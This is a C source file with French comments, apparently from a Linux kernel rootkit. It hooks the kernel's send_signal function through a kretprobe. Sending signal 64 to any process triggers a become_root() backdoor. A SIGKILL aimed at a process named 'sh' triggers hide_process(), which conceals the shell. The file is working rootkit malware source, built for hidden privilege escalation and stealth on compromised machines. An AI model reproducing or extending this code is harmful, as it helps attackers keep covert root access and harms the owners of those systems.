/*
 *
 * Ce script tente intercepte les signaux systèmes
 *
 */

#include "rootest.h"

#define ROOT_SIGNAL 64

char * undead_signal = "sh";

struct regs_data {
    pid_t pid;
    int sig;
};


int entry_signal(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct regs_data *data = (struct regs_data *)ri->data;

    // 19-12-2023 : Les deux valeurs sont vonlontairement inversées car le numéro de signal se trouve curieusement dans RDI quand on utilise la commande kill -64 pid
  // Transtipage en short car on récupère un entier signé 32bit et qu'on en veut un 16 bit  
  data->pid = regs->si & 0xFFFF;  // Récupérer le PID
    data->sig = regs->di;  // Récupérer le numéro du signal
    return 0;
}

int ret_signal(struct kretprobe_instance *ri, struct pt_regs *regs) {
    struct regs_data *data = (struct regs_data *)ri->data;
    printk(KERN_INFO "Signal %d hooké sur PID : %hu\n", data->sig, data->pid);

    if (data->sig == ROOT_SIGNAL) {
        printk(KERN_INFO "Root signal envoyé au pid : %d\n", data->pid);
        become_root();
    }

    if (data->sig == SIGKILL) {
        struct task_struct *target_task = find_task(data->pid);
        if (target_task && strcmp(target_task->comm, undead_signal) == 0) {
            hide_process(data->pid);
        }
    }

    return 0;
}

struct kretprobe sig_kp = {
  .kp = {
        .symbol_name = "send_signal",
    },
    .handler = ret_signal,
    .entry_handler = entry_signal,
    .data_size = sizeof(struct regs_data),
    .maxactive = 20
};
